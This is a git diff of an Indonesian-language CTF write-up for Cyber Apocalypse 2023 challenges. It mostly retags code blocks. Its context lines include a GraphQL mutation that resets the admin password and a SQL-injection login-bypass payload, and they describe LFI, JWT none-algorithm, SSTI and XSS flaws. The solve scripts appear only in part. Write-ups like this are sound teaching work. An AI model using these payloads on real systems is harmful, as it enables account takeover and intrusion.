@@ -8,7 +8,7 @@ Tag: (GraphQL)
 
 Saat melihat source code pada challenge kita akan menemukan endpoint `/graphql` pada `/routes/index.js`
 
-```
+```js
 router.use('/graphql', AuthMiddleware, graphqlHTTP({
     schema: GraphqlSchema,
     graphiql: false
@@ -18,7 +18,7 @@ router.use('/graphql', AuthMiddleware, graphqlHTTP({
 
 Dan saat kita masuk ke directory `/helpers/GraphqlHelper.js` kita akan menemukan fungsi mutation `UpdatePassword`.
 
-```
+```js
         UpdatePassword: {
             type: ResponseType,
             args: {
@@ -40,7 +40,7 @@ Dan saat kita masuk ke directory `/helpers/GraphqlHelper.js` kita akan menemuk
 
 Fungsi ini akan mengupdate password berdasarkan usernamenya. Kita bisa lihat detailnya pada `/database.js`
 
-```
+```js
     async updatePassword(username, password) {
         return new Promise(async (resolve, reject) => {
             let stmt = `UPDATE users SET password = ? WHERE username = ?`;
@@ -65,7 +65,7 @@ Fungsi ini akan mengupdate password berdasarkan usernamenya. Kita bisa lihat det
 
 Jadi untuk melakukan exploitasi kita harus merubah password dari akun admin, dapat kita lihat di `entrypoint.sh`
 
-```
+```js
 ...snip...
 INSERT INTO passman.users (username, password, email, is_admin)
 VALUES
@@ -85,9 +85,8 @@ Ingat kita perlu register dan login terlebih dahulu dikarenakan fungsi `UpdateP
 
 Sekarang kita perlu melakukan mutation berikut untuk mengganti password dari admin menjadi foo.
 
-```
+```gql
 mutation { UpdatePassword(username:"admin",password:"foo") { message } }
-
 ```
 
 ![https://i.imgur.com/Bi9l9EZ.png](https://i.imgur.com/Bi9l9EZ.png)
@@ -112,7 +111,7 @@ Pertama kita harus membypass login page berikut, untuk mendapat akses ke fungsi 
 
 Saat kita melihat source code pada challenge ini, kita akan mendapatkan SQL injection pada fungsi `login()` pada file `/challenge/application/database.py`
 
-```
+```python
 def login(username, password):
     # I don't think it's not possible to bypass login because I'm verifying the password later.
     user = query(f'SELECT username, password FROM users WHERE username = "{username}"', one=True)
@@ -122,7 +121,7 @@ def login(username, password):
 
 Fungsi ini akan dipanggil saat kita mengunjungi endpoint `/login` dengan `POST` request.
 
-```
+```python
 @api.route('/login', methods=['POST'])
 def apiLogin():
     if not request.is_json:
@@ -149,7 +148,7 @@ Sekarang mari kita eksploitasi SQL Injection tersebut untuk membypass login page
 
 Pertama kita perlu mengintercept post request dari login page dan merubah json requestnya menjadi seperti ini.
 
-```
+```json
 {"username":"foo\" UNION SELECT 'admin', '7815696ecbf1c96e6894b779456d330e';-- -","password":"asd"}
 
 ```
@@ -160,7 +159,7 @@ Sedikit penjelasan bahwa `7815696ecbf1c96e6894b779456d330e` adalah md5 dari `
 
 `database.py`
 
-```
+```python
 ...snip...
         passwordCheck = passwordVerify(user['password'], password)
 ...snip...
@@ -169,7 +168,7 @@ Sedikit penjelasan bahwa `7815696ecbf1c96e6894b779456d330e` adalah md5 dari `
 
 `util.py`
 
-```
+```python
 def passwordVerify(hashPassword, password):
     md5Hash = hashlib.md5(password.encode())
 
@@ -186,7 +185,7 @@ Setelah kita mengirimkan request tersebut, kita akan dialihkan ke halaman utama 
 
 Saat melihat ke file `routes.py` kita akan menemukan endpoint yang vulnerable dengan LFI
 
-```
+```python
 @api.route('/export', methods=['POST'])
 @isAuthenticated
 def exportFile():
@@ -198,7 +197,7 @@ def exportFile():
 
 ```
 
-```
+```python
 ...snip...
 COPY flag.txt /signal_sleuth_firmware
 COPY files /communications/
@@ -220,7 +219,7 @@ Tag: (JWT None Algorithm, SSTI)
 
 Saat kita melihat source code pada `/middleware/AdminMidleware.js` kita akan melihat bahwa kode tersebut vulnerable dengan [JWT None Algorithm Attack](https://blog.pentesteracademy.com/hacking-jwt-tokens-the-none-algorithm-67c14bb15771).
 
-```
+```python
 ...snip...
 const decoded = jwt.decode(sessionCookie, { complete: true });
 
@@ -264,7 +263,7 @@ pada endpoint `/admin` kita akan melihat vulnerability SSTI seperti berikut.
 
 `routers/index.js`
 
-```
+```js
     router.get("/admin", AdminMiddleware, async (req, res) => {
         try {
             const users = await db.Users.findAll();
@@ -305,7 +304,7 @@ Di halaman utama terdapat flag dan juga XSS yang kita bisa manfaatkan, tetapi te
 
 `index.js`
 
-```
+```js
 application.use((req, res, next) => {
   res.setHeader("Content-Security-Policy", "script-src 'self'; frame-ancestors 'none'; object-src 'none'; base-uri 'none';");
   res.setHeader("Cache-Control", "no-cache, no-store, must-revalidate");
@@ -320,7 +319,7 @@ Terdapat CSP `script-src 'self'` yang berarti kita hanya bisa mengimport scrip
 
 `/routes/agents.js`
 
-```
+```js
 router.post(
   "/agents/upload/:identifier/:token",
   authAgent,
@@ -355,7 +354,7 @@ Jadi hal yang perlu kita lakukan adalah:
 
 Solve script:
 
-```
+```python
 import requests
 from pwn import log, context
 
@@ -414,7 +413,7 @@ Setelah itu kita bisa membuat `worker` palsu dan mentrigger pickle load pada f
 
 Berikut solve script yang saya gunakan untuk menyelesaikan challenge ini.
 
-```
+```python
 import requests
 from base64 import b64encode
 
@@ -649,7 +648,7 @@ diberikan file .sh yang mana didalam nya script bash. lalu pada line 10 terdapat
 
 ![https://cdn.discordapp.com/attachments/1085884758174728202/1088490142966239252/image.png](https://cdn.discordapp.com/attachments/1085884758174728202/1088490142966239252/image.png)
 
-# Our Team Write Up
+# Our Community Member Write Up
 
 1. Daffainfo [https://github.com/daffainfo/ctf-writeup/tree/main/Cyber Apocalypse 2023 The Cursed Mission](https://github.com/daffainfo/ctf-writeup/tree/main/Cyber%20Apocalypse%202023%20The%20Cursed%20Mission)
     
